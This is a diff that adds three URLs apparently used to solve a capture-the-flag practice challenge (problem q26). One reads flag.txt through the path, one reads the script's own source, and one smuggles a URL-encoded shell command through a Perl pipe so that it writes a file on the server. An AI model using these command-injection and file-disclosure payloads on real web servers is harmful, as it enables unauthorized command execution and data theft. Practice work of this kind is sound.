@@ -1,0 +1,5 @@
+http://ctfq.sweetduet.info:10080/~q26/index.pl/flag.txt
+
+http://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl
+
+http://ctfq.sweetduet.info:10080/~q26/index.pl/echo%20%27h@ck3d!%27%20%3E%20cracked.txt%20|
